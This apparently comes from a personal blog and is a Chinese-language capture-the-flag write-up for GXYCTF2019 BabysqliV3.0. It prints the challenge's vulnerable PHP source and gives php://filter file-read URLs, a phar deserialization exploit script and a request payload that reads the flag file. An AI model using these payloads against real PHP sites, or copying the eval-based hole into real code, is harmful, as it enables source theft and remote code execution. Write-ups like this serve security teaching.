---
title: '[GXYCTF2019]BabysqliV3.0'
date: 2024-09-03 14:39:33
tags: 题解
categories: 刷题笔记
---

### [GXYCTF2019]BabysqliV3.0

看到页面有一个登录框，我们用admin/password就登录成功了

![image-20240903210741138](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032107273.png)

我们发现url有点眼熟，我们尝试php伪协议读取文件

<!--more-->

```
/home.php?file=php://filter/convert.base64-encode/resource=home
```

得到home.php的源码

![image-20240903211247219](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032112258.png)

```
<?php
session_start();
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
error_reporting(0);
if(isset($_SESSION['user'])){
        if(isset($_GET['file'])){
                if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
                        die("hacker!");
                }
                else{
                        if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
                                $file = $_GET['file'].".php";
                        }
                        else{
                                $file = $_GET['file'].".fxxkyou!";
                        }
                        echo "当前引用的是 ".$file;
                        require $file;
                }

        }
        else{
                die("no permission!");
        }
}
?>

```

同样的，我们读取upload.php的源码

```
/home.php?file=php://filter/convert.base64-encode/resource=upload
```

```
<?php
error_reporting(0);
class Uploader{
        public $Filename;
        public $cmd;
        public $token;


        function __construct(){
                $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
                $ext = ".txt";
                @mkdir($sandbox, 0777, true);
                if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
                        $this->Filename = $_GET['name'];
                }
                else{
                        $this->Filename = $sandbox.$_SESSION['user'].$ext;
                }

                $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
                $this->token = $_SESSION['user'];
        }

        function upload($file){
                global $sandbox;
                global $ext;

                if(preg_match("[^a-z0-9]", $this->Filename)){
                        $this->cmd = "die('illegal filename!');";
                }
                else{
                        if($file['size'] > 1024){
                                $this->cmd = "die('you are too big (′▽`〃)');";
                        }
                        else{
                                $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
                        }
                }
        }

        function __toString(){
                global $sandbox;
                global $ext;
                // return $sandbox.$this->Filename.$ext;
                return $this->Filename;
        }

        function __destruct(){
                if($this->token != $_SESSION['user']){
                        $this->cmd = "die('check token falied!');";
                }
                eval($this->cmd);
        }
}

if(isset($_FILES['file'])) {
        $uploader = new Uploader();
        $uploader->upload($_FILES["file"]);
        if(@file_get_contents($uploader)){
                echo "下面是你上传的文件：<br>".$uploader."<br>";
                echo file_get_contents($uploader);
        }
}

?>


```

### 预期解

由于__destruct() 方法中，想要 eval(\$this->cmd); 的前提条件是 \$this->token 和$\_SESSION[‘user’] 相等

```
function __destruct(){
	if($this->token != $_SESSION['user']){
		$this->cmd = "die('check token falied!');";
	}
	eval($this->cmd);
}

```

在__construct() 方法中可见如下两行代码

```
$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
$this->Filename = $sandbox.$_SESSION['user'].$ext;

```

因此可以先随便上传一个 txt，得到的路径中，.txt 前面的就是 $_SESSION[‘user’]

![image-20240903213553120](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032135202.png)

得到：`GXY76f8a4e2acfb26839a076ae2ac5bc5d6`，生成phar，并将生成的phar上传

```
<?php
class Uploader{
    public $Filename;
    public $cmd;
    public $token;
}

$upload = new Uploader();
$upload->cmd = "highlight_file('/var/www/html/flag.php');";
$upload->Filename = 'test';
$upload->token = 'GXY76f8a4e2acfb26839a076ae2ac5bc5d6';

$phar = new Phar("exp.phar");
$phar->startBuffering();
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($upload); 
$phar->addFromString("exp.txt", "test");
$phar->stopBuffering();

```

得到路径`/var/www/html/uploads/93cd61477a821014fa4b00df090ebdcd/GXY3fb034f8f0c46f14bf11438f9afccbf4.txt`

然后将这个路径带上 phar:// 作为 name 参数的值，再随意上传一个文件，因为 $this->Filename 被我们手工指定为 phar，触发了 phar 反序列化导致命令执行
Payload：

```
/home.php?file=upload&name=phar:///var/www/html/uploads/93cd61477a821014fa4b00df090ebdcd/GXY3fb034f8f0c46f14bf11438f9afccbf4.txt
传任意文件后，得到 flag

```

![image-20240903215212229](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032152464.png)



### 非预期

由于`echo file_get_contents($uploader);`上传后会显示出\$uploader 这个文件的内容，所以只要使 $this-Filename 为 flag.php 然后随便传个东西就会得到 flag 了

![image-20240903215654960](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032156058.png)

![image-20240903215715243](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032157272.png)
